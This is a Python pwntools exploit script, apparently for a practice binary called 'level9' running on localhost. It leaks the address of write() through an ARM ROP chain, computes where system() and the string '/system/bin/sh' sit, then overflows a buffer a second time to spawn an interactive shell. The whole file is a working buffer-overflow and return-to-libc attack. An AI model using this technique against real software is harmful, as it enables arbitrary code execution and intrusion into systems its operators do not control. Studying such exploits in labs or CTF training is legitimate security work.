#!/usr/bin/env python
from pwn import *

p = remote('127.0.0.1',10004)

p.recvuntil('\n')

#gadgets in level9
#0x000088be : ldr r0, [sp, #0xc] ; add sp, #0x14 ; pop {pc}
gadget1 = 0x000088be + 1
#0x0000863a : pop {r1, r2, r4, r5, r6, pc}
gadget2 = 0x0000863a + 1

#.text:000084D8 vulnerable_function
ret_to_vul = 0x000084D8 + 1

#write(r0=1, r1=0x0000AFE8, r2=4)
r0 = 1
r1 = 0x0000AFE8  # write() address in GOT
r2 = 4
r4 = 0
r5 = 0
r6 = 0
write_addr_plt = 0x000083C8

payload =  '\x00'*132 + p32(gadget1) + '\x00'*0xc + p32(r0) + '\x00'*0x4 + p32(gadget2) + p32(r1) + p32(r2) + p32(r4) + p32(r5) + p32(r6) + p32(write_addr_plt) + '\x00' * 0x84 + p32(ret_to_vul)

p.send(payload)

write_addr = u32(p.recv(4))
print 'write_addr=' + hex(write_addr)

#.rodata:0005AAFF   aSystemBinSh    DCB "/system/bin/sh",0
#.text:00039960                 EXPORT system
#.text:0003A228                 EXPORT write

r0 = write_addr + (0x0005AAFF - 0x0003A228) #/system/bin/sh addr
system_addr = write_addr + (0x00039960 - 0x0003A228) + 1

print 'r0=' + hex(r0)
print 'system_addr=' + hex(system_addr)

payload2 =  '\x00'*132 + p32(gadget1) + "\x00"*0xc + p32(r0) + "\x00"*0x4 + p32(system_addr)

p.send(payload2)

p.interactive()

